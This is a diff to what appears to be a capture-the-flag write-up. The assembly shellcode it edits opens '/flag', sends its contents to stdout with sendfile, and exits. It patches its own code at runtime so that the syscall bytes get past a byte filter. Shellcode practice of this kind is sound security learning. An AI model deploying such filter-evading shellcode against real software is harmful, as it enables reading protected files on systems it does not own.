@@ -75,11 +75,10 @@ syscall
 ```s
 .intel_syntax noprefix
 .globl _start
-
 .section .text
-
 _start:
 
+# open("/flag",NULL)
 push 0x616c662f
 mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
 push rsp
@@ -91,6 +90,7 @@ pop rax                     # mov rax,2
 inc byte ptr [rip]
 .byte 0x0e,0x05             # syscall
 
+# sendfile(1,fd,0,60)
 push 1
 pop rdi                     # mov rdi,1
 push rax
@@ -104,7 +104,8 @@ pop rax                     # mov rax,40
 inc byte ptr [rip]
 .byte 0x0e,0x05             # syscall
 
-push 0
+# exit(0)
+push 0                      
 pop rdi                     # xor rdi,rdi
 push 60
 pop rax                     # mov rax,60
